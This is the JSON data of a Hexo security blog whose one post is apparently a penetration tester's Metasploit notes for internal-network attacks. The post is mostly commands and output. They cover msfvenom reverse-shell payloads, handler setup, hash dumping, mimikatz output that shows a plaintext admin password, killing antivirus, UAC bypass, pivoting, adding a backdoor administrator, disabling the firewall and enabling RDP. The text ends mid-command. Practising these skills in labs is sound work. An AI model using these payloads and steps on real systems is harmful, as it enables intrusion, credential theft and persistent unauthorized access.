{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://s1eady.top","root":"/"},"pages":[{"title":"分类","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"categories/index.html","permalink":"http://s1eady.top/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"books/index.html","permalink":"http://s1eady.top/books/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"repository/index.html","permalink":"http://s1eady.top/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":true,"path":"links/index.html","permalink":"http://s1eady.top/links/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-10-02T07:27:50.844Z","updated":"2020-10-02T07:27:50.831Z","comments":false,"path":"about/index.html","permalink":"http://s1eady.top/about/index.html","excerpt":"","text":"123456789101112131415161718192021&#123; name: &#x27;steady&#x27; age: 21, gender: &#x27;男&#x27;, profession: &#x27;Penetration Testing&#x27;, education: &#x27;本科&#x27;, email: &#x27;steady_boy@163.com&#x27;, description: &#x27;热爱web安全，擅长渗透测试、漏洞挖掘、内网渗透。&#x27;, skills: [ [&#x27;Python&#x27;, &#x27;Javascript&#x27;, &#x27;[Php]&#x27;, &#x27;Java&#x27;], [&#x27;web安全&#x27;, &#x27;渗透测试&#x27;], [&#x27;内网渗透&#x27;,&#x27;应急响应&#x27;], [&#x27;Linux&#x27;, &#x27;代码审计&#x27;], ], devTools: [ [&#x27;Xray&#x27;, &#x27;AWVS&#x27;, &#x27;BurpSuite&#x27;], [&#x27;metasploit&#x27;, &#x27;Fiddler&#x27;] ] &#125;"},{"title":"标签","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"tags/index.html","permalink":"http://s1eady.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"内网学习--Metasploit使用","slug":"内网学习--Metasploit使用","date":"2020-08-22T14:46:26.000Z","updated":"2020-10-13T12:00:37.897Z","comments":true,"path":"2020/08/22/内网学习--Metasploit使用/","link":"","permalink":"http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Metasploit使用基础常用命令进入CMD-shell123456meterpreter &gt; shellProcess 4180 created.Channel 3 created.Microsoft Windows [�汾 6.1.7601]C:\\Users\\Administrator.WEB\\Desktop&gt; 解决中文乱码问题1chcp 65001 或者将终端临时设置为GBK系列编码即可 获取shell常见shell生成1234567891011121314151617181920212223242526Linux：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfWindows:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exePHP:msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASP:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSP:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspPython:msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBash:msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerl:msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl PHP-Shell 生成一句话木马 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php 12345➜ Desktop msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.109 LPORT&#x3D;1234 R &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1114 bytes msfconsole 监听端口 123456789msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IPlhost &#x3D;&gt; 192.168.0.108msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口msf5 exploit(multi&#x2F;handler) &gt; run[-] Handler failed to bind to 192.168.0.108:1234:- -[*] Started reverse TCP handler on 0.0.0.0:1234 EXE-木马 生成木马 1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 -f exe &gt; hacker.exe msfconsole监听端口 123456msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set LHOST 攻击IPmsf5 exploit(multi&#x2F;handler) &gt; set LPORT 监听端口msf5 exploit(multi&#x2F;handler) &gt; exploit 升级正常的Shell到Meterpreter通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell, 因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions Command 可以帮助我们实现从Shell 到Meterpreter提升。 12345678910111213msf5&gt;run post/multi/manage/shell_to_meterpretermsf5 post(multi/manage/shell_to_meterpreter) &gt; show optionsModule options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on.msf5&gt;set session 2msf5&gt;run 使用一下命名进行切换 1sessions -u sessionid 会话操作基本操作12sessions #查看会话sessions -i &lt;ID值&gt; #进入会话 -k 杀死会话 将回话保存到后台，进入会话12345meterpreter &gt; background[*] Backgrounding session 1...切换到会话1msf5 exploit(multi&#x2F;handler) &gt; sessions -i 1[*] Starting interaction with 1... 查看会话12345678msf5 &gt; sessions -lActive sessions&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter x86&#x2F;windows NT AUTHORITY\\SYSTEM @ STU1 172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6) 抓取hash密码–需要AUTHORITY\\SYSTEM权限 123456789101112131415161718192021run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdumpmeterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump[*] Running module against STU1[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200903163754_default_172.20.10.6_windows.hashes_560643.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[*] No users with password hints on this system[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd::: 如果没有权限 123456789meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump[*] Running module against WEB[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20201012180509_default_172.20.10.13_windows.hashes_113739.txt[*] Dumping password hashes...[-] On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes[-] Try setting GETSYSTEM to true. 进程迁移在刚获得的Meterpreter Shell时，该shell极其脆弱和易受攻击的，所以获得此shell的第一步就是将其迁移，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。 查看当前活跃进程12345678910111213141516meterpreter &gt; psProcess List&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 124 500 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 256 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 340 332 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 392 332 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 404 384 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 440 384 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 500 392 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 获取当前进程的PID12meterpreter &gt; getpidCurrent pid: 1912 杀死进程1kill &lt;pid值&gt; 迁移进程1migrate &lt;pid值&gt; #将Meterpreter会话移植到指定pid值进程中 自动迁移进程1自动迁移进程命令：run post&#x2F;windows&#x2F;manage&#x2F;migrate 信息收集本机信息收集查看当前用户权限1getuid # 查看权限 查看系统信息12345678meterpreter &gt; sysinfoComputer : WEBOS : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : DE1AYLogged On Users : 3Meterpreter : x86&#x2F;windows 获取软件安装信息1run post&#x2F;windows&#x2F;gather&#x2F;enum_applications 1234567891011121314151617181920212223meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications[*] Enumerating applications installed on WEBInstalled Applications&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Name Version ---- ------- 360安全卫士 12.0.0.2002 360安全卫士 12.0.0.2002 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789) 1 Microsoft Office 2003 Web Components 12.0.6213.1000 Microsoft Office 2003 Web Components 12.0.6213.1000 关闭杀毒软件1run post&#x2F;windows&#x2F;manage&#x2F;killav 判断是否是虚拟机123run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm 查看补丁信息1234567run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #补丁信息meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches[*] Patch list saved to &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200906182724_default_172.20.10.6_enum_patches_447671.txt[*] KB2534111 applied[*] KB2999226 applied[*] KB976902 applied Hash与明文密码获取获取目标机系统用户Hash 12345678910111213141516171819run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump[*] Running module against STU1[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200903163754_default_172.20.10.6_windows.hashes_560643.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[*] No users with password hints on this system[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd::: 获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理) 1meterpreter &gt; upload mimikatz.exe 目标位置 mimikatz的使用 123456789101112131415161718192021222324252627282930313233343536373839404142c:\\\\mimikatz.exec:\\&gt;mimikatz.exemimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## &#x2F; \\ ## &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com ) ## \\ &#x2F; ## &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com ***&#x2F;mimikatz # privilege::debugPrivilege &#39;20&#39; OKmimikatz # sekurlsa::logonPasswordsAuthentication Id : 0 ; 2499588 (00000000:00262404)Session : Interactive from 1User Name : AdministratorDomain : GODLogon Server : OWALogon Time : 2020&#x2F;9&#x2F;3 13:38:09SID : S-1-5-21-2952760202-1353902439-2381784089-500 msv : [00000003] Primary * Username : Administrator * Domain : GOD * LM : 3333deaae325ebb705026d3fb1a43796 * NTLM : 7d0e302e0cbd94d9353ac4a51d7c39c1 * SHA1 : d4f206f0d8303230185b2ff2fedb7d40a62effa5 tspkg : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. wdigest : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. kerberos : * Username : Administrator * Domain : GOD.ORG * Password : 1999118gxaGXA. ssp : credman : 域信息收集查找域控制器12345run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #查找域控meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_domain[+] FOUND Domain: god[+] FOUND Domain Controller: owa (IP: 192.168.52.138) ifconfig查看DNS服务器地址代理与端口设置端口转发1portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口 设置sockets5代理搜索一下可用代理 1234567891011msf5 &gt; search socksMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary&#x2F;scanner&#x2F;http&#x2F;sockso_traversal 2012-03-14 normal No Sockso Music Host Server 1.5 Directory Traversal 1 auxiliary&#x2F;server&#x2F;socks4a normal No Socks4a Proxy Server 2 auxiliary&#x2F;server&#x2F;socks5 normal No Socks5 Proxy Server 3 auxiliary&#x2F;server&#x2F;socks_unc normal No SOCKS Proxy UNC Path Redirection 设置代理 12345678910111213141516171819202122232425262728msf5 &gt; use auxiliary&#x2F;server&#x2F;socks5msf5 auxiliary(server&#x2F;socks5) &gt; show optionsModule options (auxiliary&#x2F;server&#x2F;socks5): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD no Proxy password for SOCKS5 listener SRVHOST 0.0.0.0 yes The address to listen on SRVPORT 1080 yes The port to listen on USERNAME no Proxy username for SOCKS5 listenerAuxiliary action: Name Description ---- ----------- Proxymsf5 auxiliary(server&#x2F;socks5) &gt; set SRVHOST 127.0.0.1SRVHOST &#x3D;&gt; 127.0.0.1msf5 auxiliary(server&#x2F;socks5) &gt; set SRVPORT 5555SRVPORT &#x3D;&gt; 5555msf5 auxiliary(server&#x2F;socks5) &gt; run[*] Auxiliary module running as background job 0.msf5 auxiliary(server&#x2F;socks5) &gt;[*] Starting the socks5 proxy server 然后也可以直接使用一下命令 12set proxies socks5:127.0.0.1:8990 设置代理setg ReverseAllowProxy true 允许反向代理 获取内网网段 1234567meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Local subnet: 169.254.0.0&#x2F;255.255.0.0Local subnet: 172.20.10.0&#x2F;255.255.255.240Local subnet: 192.168.52.0&#x2F;255.255.255.0 添加路由 1meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24 查看是否添加成功 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Active Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 198.168.52.0 255.255.255.0 Session 1 ARP扫描内网主机 添加去往”内网网段”的路由 MSF 路由添加帮助查询命令 12345678910111213meterpreter &gt; run autoroute -h[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Usage: run autoroute [-r] -s subnet -n netmask[*] Examples:[*] run autoroute -s 10.1.1.0 -n 255.255.255.0 # Add a route to 10.10.10.1&#x2F;255.255.255.0[*] run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0[*] run autoroute -s 10.10.10.1&#x2F;24 # CIDR notation is also okay[*] run autoroute -p # Print active routing table[*] run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1&#x2F;255.255.255.0 route[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes[-] Deprecation warning: This script has been replaced by the post&#x2F;multi&#x2F;manage&#x2F;autoroute module 获取目标内网地址段 具体获取被攻击目标内网地址网段的命令 12345meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Local subnet: 172.17.0.0&#x2F;255.255.0.0 由上可以获知，目标内网网段是“172.17.0.0./24” 添加去往目标网段的转发路由 在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法 1234567meterpreter &gt; run autoroute -s 172.17.0.0&#x2F;24[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Adding a route to 172.17.0.0&#x2F;255.255.255.0...[+] Added route to 172.17.0.0&#x2F;255.255.255.0 via 10.48.8.234[*] Use the -p option to list all active routes 添加网路由后，我们来查看下路由的添加情况如何 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Active Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 172.17.0.0 255.255.255.0 Session 3 将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。 删除路由 1meterpreter &gt; run autoroute -d -s 172.20.10.0 autoroute模块获取当前机器的所有网段信息123456meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Local subnet: 10.10.10.0&#x2F;255.255.255.0Local subnet: 172.20.10.0&#x2F;255.255.255.240 添加目标内网网段的路由1234567meterpreter &gt; run autoroute -s 10.10.10.0&#x2F;24[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Adding a route to 10.10.10.0&#x2F;255.255.255.0...[+] Added route to 10.10.10.0&#x2F;255.255.255.0 via 172.20.10.13[*] Use the -p option to list all active routes 打印当前添加的路由表信息1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Active Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 10.10.10.0 255.255.255.0 Session 4 删除指定的路由 1meterpreter &gt; run autoroute -d -s 10.10.10.0&#x2F;24 内网主机发现进去内网之后，我们使用相关模块进行主机发现。 TCP扫描12345678910111213msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcpmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show optionsmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10threads &#x3D;&gt; 10msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100RHOSTS &#x3D;&gt; 172.18.0.2-100msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022PORTS &#x3D;&gt; 3306,8022msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit[+] 172.18.0.3: - 172.18.0.3:3306 - TCP OPEN[+] 172.18.0.2: - 172.18.0.2:8022 - TCP OPEN[*] 172.18.0.2-100: - Scanned 10 of 99 hosts (10% complete) ARP扫描1use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner Metasploit Portfwd（端口转发/重定向）在活动的Meterpreter会话中，键入portfwd -h将显示命令的各种选项和参数。 123456789meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L &gt;opt&gt; 要监听的本地主机（可选）。 -h 帮助横幅。 -l &gt;opt&gt; 要监听的本地端口。 -p &gt;opt&gt; 要连接的远程端口 -r &gt;opt&gt; 要连接的远程主机meterpreter &gt; Options：选项 123456789-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。-h：显示以上信息。-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。-p：TCP连接将转发到的端口。-r：连接被中继到的IP地址（目标）。 Arguments：参数 1234567Add：该参数用于创建转发。Delete：这将从我们的转发端口列表中删除先前的条目。List：这将列出当前转发的所有端口。Flush：这将删除我们的转发列表中的所有端口。 例子： Add参数 1meterpreter &gt; portfwd add –l 3389 –p 3389 –r [target host] 1234add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。-p 3389是我们的定向主机上的目标端口。-r [target host]是我们的目标系统的IP或主机名。 List参数 12345meterpreter &gt; portfwd list0: 0.0.0.0:3389 -&gt; 172.16.194.191:33891: 0.0.0.0:1337 -&gt; 172.16.194.191:13372: 0.0.0.0:2222 -&gt; 172.16.194.191:22223 total local port forwards. Windows权限提升 绕过UAC bypassuac 12345678910111213141516171819202122msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac或者msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionmsf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use if UAC is turned off (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windows x86msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1set target 1 #设置目标系统类型，1是64位，0是32位 12use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。 RunAs绕过 创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。 123456789101112131415161718192021msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;askmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;ask): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME no File name on disk PATH no Location on disk, %TEMP% used if not set SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windowsmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; Windows渗透cmd与3389 监听木马 1234567891011121314msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001[-] Unknown command: chcp.msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3LHOST &#x3D;&gt; 172.20.10.3msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234LPORT &#x3D;&gt; 1234msf5 exploit(multi&#x2F;handler) &gt; exploit[*] Started reverse TCP handler on 172.20.10.3:1234[*] Sending stage (176195 bytes) to 172.20.10.6[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800 获取当前权限以及提权 123456meterpreter &gt; getuidServer username: GOD\\Administratormeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限 添加用户并加入管理员组 12345678C:\\Windows\\system32&gt;net user steady111 125219gxaGXA &#x2F;addnet user steady111 125219gxaGXA &#x2F;add命令成功完成。C:\\Windows\\system32&gt;net localgroup administrators steady111 &#x2F;addnet localgroup administrators steady111 &#x2F;add命令成功完成。 开启关闭防火墙 windows2003之前 1234开启防火墙：netsh firewall set opmode mode&#x3D;enable关闭防火墙：netsh firewall set opmode mode&#x3D;disable windows2003之后 1netsh advfirewall set allprofiles state off 开启3389 123456REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f REG ADD 